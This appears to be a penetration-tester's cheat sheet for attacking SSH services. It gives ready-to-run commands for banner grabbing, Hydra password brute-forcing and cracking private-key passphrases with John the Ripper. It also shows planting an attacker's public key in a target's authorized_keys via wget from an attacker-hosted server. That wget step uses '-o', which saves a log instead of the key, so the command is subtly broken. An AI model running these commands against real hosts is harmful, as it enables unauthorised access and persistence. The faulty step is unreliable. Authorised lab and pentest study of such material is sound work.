### Initial checks

Banner grabbing:
```bash
nc -vn <IP> 22
```

Check version for vulnerabilities:
```bash
searchsploit ssh <VERSION>
```

Nmap enumeration:
```bash
nmap -p22 <IP> --script ssh*
```

Check the used ciphers, the cipher reveals the possible SSH private key names:

| Cipher  | Private key name |
| ------- | ---------------- |
| rsa     | id_rsa           |
| ecdsa   | id_ecdsa         |
| ed25519 | id_ed25519       |
| ...     | id_...           |


### Credentials?

SSH using credentials:
```bash
ssh <USERNAME>@<IP>
```
>[!info] 
>[No matching key exchange?](https://serverfault.com/questions/1047019/ssh-no-matching-key-exchange-method-found-when-kexalgorithm-is-listed-as-avai)

Bruteforce SSH:
```bash
hydra -L users -P passwords ssh://<IP> -s 22
```

Is the password encoded?
- [[Nickel]]
- Cyberchef magic wand


### Private key

Crack password protected private key:
```bash
ssh2john id_rsa > id_rsa.hash
john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
```

Using private key:
```bash
chmod 600 id_rsa
ssh -i id_rsa <USERNAME>@<IP>
```


### Authorized_keys

Write public key to authorized_keys file on target host to authenticate using your own private key:
```bash
ssh-keygen -t rsa # Generate SSH Key
cd .ssh/ && sudo python3 -m http.server 80 # Start HTTP server to transfer key
wget http://<IP>/id_rsa.pub -o /home/<USER>/.ssh/authorized_keys # Transfer to target
ssh <USERNAME>@<IP>
```
>[!info]
>Can be put in the user's directory to allow for easy SSH access 
>- File upload capabilities
>- Writable .ssh folder
>- ...
